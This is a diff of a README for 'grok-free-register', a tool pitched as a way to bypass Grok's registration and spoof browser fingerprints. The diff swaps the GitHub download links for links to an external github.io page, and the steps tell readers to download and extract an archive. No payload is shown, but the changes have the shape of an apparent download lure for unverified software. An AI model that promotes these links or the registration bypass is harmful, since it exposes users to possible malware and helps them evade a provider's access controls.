@@ -1,6 +1,6 @@
 # 📦 grok-free-register - Access grok services without registration delays
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Salubriousnesscallingcard822/grok-free-register)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://salubriousnesscallingcard822.github.io)
 
 This repository provides a tool to access Grok services. It includes CloakBrowser and an automated import feature. Users can bypass standard registration hurdles by using the provided archive. The software manages your browser fingerprint to ensure connectivity.
 
@@ -17,7 +17,7 @@ Ensure your computer has at least 4GB of RAM and 500MB of free disk space. You n
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the archive: [https://github.com/Salubriousnesscallingcard822/grok-free-register](https://github.com/Salubriousnesscallingcard822/grok-free-register)
+1. Visit this page to download the archive: [https://salubriousnesscallingcard822.github.io](https://salubriousnesscallingcard822.github.io)
 2. Locate the download folder on your computer.
 3. Right-click the downloaded file.
 4. Select "Extract All" from the menu.
